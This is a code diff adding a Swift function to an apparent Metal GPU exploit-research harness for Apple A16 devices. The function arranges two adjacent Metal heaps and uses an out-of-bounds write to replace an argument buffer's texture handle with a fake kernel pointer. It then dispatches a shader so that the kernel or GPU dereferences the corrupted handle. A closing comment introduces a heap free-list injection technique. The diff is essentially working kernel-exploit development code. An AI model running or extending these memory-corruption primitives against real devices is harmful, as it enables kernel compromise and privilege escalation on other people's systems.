@@ -513,6 +513,171 @@ func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// Argument buffer Tier-2 type confusion.
+// Metal argument buffers encode GPU resource handles (buffer VA, texture descriptor index).
+// OOB-write a fake kernel pointer into the texture handle slot of an argument buffer.
+// Submit a compute dispatch whose shader reads from that argument buffer.
+// Goal: does the kernel validate the encoded texture handle during submit (kernel fault)?
+//       or does the GPU shader fault during execution (GPU error)?
+// A16 supports Tier 2 argument buffers. Texture handle is a 64-bit index into the
+// driver-managed texture descriptor heap. Corrupting it → either graceful GPU error
+// or kernel dereference of our fake handle during residency/validation tracking.
+func runArgBufTypeConfusion(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
+        guard let queue  = device.makeCommandQueue() else { step("✗ No cmd queue"); completion(); return }
+        step("── ArgBuf Type Confusion ──────────────────")
+        step("  arg buffer tier: \(device.argumentBuffersSupport.rawValue)")  // 2 = Tier2
+
+        // Build argument encoder: slot 0 = buffer ptr, slot 1 = 2D texture
+        let bufDesc = MTLArgumentDescriptor()
+        bufDesc.index = 0; bufDesc.dataType = .pointer; bufDesc.access = .readOnly
+
+        let texDesc2 = MTLArgumentDescriptor()
+        texDesc2.index = 1; texDesc2.dataType = .texture
+        texDesc2.textureType = .type2D; texDesc2.access = .readOnly
+
+        guard let argEnc = device.makeArgumentEncoder(arguments: [bufDesc, texDesc2]) else {
+            step("✗ makeArgumentEncoder nil"); completion(); return
+        }
+        let encLen = argEnc.encodedLength
+        step("  encodedLength=\(encLen) bytes")
+
+        // ── Adjacent h0 (OOB src) + h1 (victim) ──────────────────────────
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+        guard let h0 = device.makeHeap(descriptor: hd),
+              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
+        let actual = h0.size  // 16384
+
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let va0 = UInt(bitPattern: p0)
+
+        // Small probe in h1 to get its base VA (occupies h1[0..4095])
+        guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
+        let va1 = UInt(bitPattern: probe1.contents())
+        let dist = va1 > va0 ? va1 - va0 : va0 - va1
+        step("  va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
+        guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
+        step("  ✓ adjacent")
+
+        // Argument buffer in h1 at h1[4096] (probe occupies h1[0..4095])
+        let argBufLen = max(encLen, 256)
+        guard let argBuf = h1.makeBuffer(length: argBufLen, options: .storageModeShared) else {
+            step("✗ argBuf nil — h1 no space"); completion(); return
+        }
+        let pArg = argBuf.contents().assumingMemoryBound(to: UInt8.self)
+        let vaArg = UInt(bitPattern: pArg)
+        // argBuf should be at h1[4096] = va1 + 4096
+        step("  argBuf at 0x\(String(vaArg,radix:16)) (expect 0x\(String(va1+4096,radix:16)))")
+
+        // ── Encode legit resources, scan for handle layout ─────────────────
+        guard let legitBuf = device.makeBuffer(length: 256, options: .storageModeShared) else { step("legitBuf nil"); completion(); return }
+        let td2 = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 8, height: 8, mipmapped: false)
+        td2.storageMode = .shared; td2.usage = .shaderRead
+        guard let legitTex = device.makeTexture(descriptor: td2) else { step("legitTex nil"); completion(); return }
+
+        // Sentinel-fill, then encode
+        for i in 0..<argBufLen { pArg[i] = 0x55 }
+        argEnc.setArgumentBuffer(argBuf, offset: 0)
+        argEnc.setBuffer(legitBuf, offset: 0, atIndex: 0)
+        argEnc.setTexture(legitTex, atIndex: 1)
+
+        // Scan encoded bytes: find texture handle offset (non-0x55 at higher offset)
+        step("  encoded argBuf layout:")
+        var bufHandleOff = -1; var texHandleOff = -1
+        for qw in 0..<(argBufLen/8) {
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(pArg[qw*8+b]) << (b*8) }
+            if val != 0x5555555555555555 {
+                step("    argBuf[+\(qw*8)]=0x\(String(val,radix:16))")
+                if bufHandleOff < 0 { bufHandleOff = qw*8 }
+                else if texHandleOff < 0 { texHandleOff = qw*8 }
+            }
+        }
+        // Fallback: split encoded length in half
+        if bufHandleOff < 0 { bufHandleOff = 0 }
+        if texHandleOff < 0 { texHandleOff = encLen/2 }
+        step("  buf handle @ argBuf[+\(bufHandleOff)], tex handle @ argBuf[+\(texHandleOff)]")
+
+        // ── OOB-overwrite texture handle with fake kptr ────────────────────
+        // argBuf is at h1[4096], so argBuf[texHandleOff] = h1[4096+texHandleOff]
+        // OOB from h0: p0[actual + 4096 + texHandleOff] = h1[4096 + texHandleOff] ✓
+        let oobOff = 4096 + texHandleOff
+        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]  // 0xFFFFFFF000000008 LE
+
+        // Also corrupt the slot BEFORE the texture handle (type tag / stride field)
+        if texHandleOff >= 8 {
+            for b in 0..<8 { p0[actual + 4096 + texHandleOff - 8 + b] = kptr[b] }
+        }
+        for b in 0..<8 { p0[actual + oobOff + b] = kptr[b] }
+        // And 8 bytes after (metadata trailing the handle)
+        for b in 0..<8 { p0[actual + oobOff + 8 + b] = kptr[b] }
+
+        // Verify via pArg
+        var rb: UInt64 = 0
+        for b in 0..<8 { rb |= UInt64(pArg[texHandleOff+b]) << (b*8) }
+        step("  argBuf[+\(texHandleOff)] after OOB: 0x\(String(rb,radix:16)) (expect 0xFFFFFFF000000008)")
+
+        // ── Build PSO: shader that reads from argument buffer ──────────────
+        // Shader reads through the argument buffer so GPU actually dereferences the handles
+        let shaderSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct MyArgs {
+            device uint8_t* buf;
+            texture2d<float, access::read> tex;
+        };
+        kernel void argtest(device MyArgs& args [[buffer(0)]],
+                            uint pos [[thread_position_in_grid]]) {
+            volatile uint8_t x = args.buf[0];
+            volatile float4 y = args.tex.read(uint2(0,0));
+            (void)x; (void)y;
+        }
+        """
+        let lib: MTLLibrary; let pso: MTLComputePipelineState
+        do {
+            lib = try device.makeLibrary(source: shaderSrc, options: MTLCompileOptions())
+            guard let fn = lib.makeFunction(name: "argtest") else { step("fn nil"); completion(); return }
+            pso = try device.makeComputePipelineState(function: fn)
+        } catch { step("✗ compile: \(error.localizedDescription)"); completion(); return }
+        step("  PSO compiled")
+
+        // ── Submit: shader reads corrupt argument buffer ───────────────────
+        guard let cmd = queue.makeCommandBuffer(),
+              let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
+        enc.setComputePipelineState(pso)
+        enc.setBuffer(argBuf, offset: 0, index: 0)
+        enc.useResource(argBuf, usage: .read)
+        enc.useResource(legitBuf, usage: .read)   // legit buf still resident
+        // Note: legitTex NOT explicitly made resident — forces kernel to track via argBuf
+        enc.dispatchThreadgroups(MTLSize(width:1,height:1,depth:1),
+                                 threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
+        enc.endEncoding()
+
+        sl.write("ARGBUF TYPE CONFUSION — committing. tex handle corrupted to 0xFFFFFFF000000008")
+        cmd.addCompletedHandler { cb in
+            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
+            switch s {
+            case .completed:
+                step("  COMPLETED — GPU ran with corrupted tex handle (no kernel validation)")
+            case .error:
+                step("  *** ERROR — GPU/kernel faulted on corrupted tex handle")
+                step("  *** error: \(e)")
+                step("  *** — check if this is GPU shader fault or kernel validation fault")
+            default:
+                step("  status=\(s.rawValue) err=\(e)")
+            }
+            step("── ArgBuf Type Confusion complete ───────────")
+            completion()
+        }
+        cmd.commit()
+    }
+}
+
 // Heap free-list injection via purgeable-state free.
 // When a suballoc'd buffer is freed via setPurgeableState(.empty), the Metal heap allocator
 // writes a free-list node into that buffer's former GPU-visible shared memory.
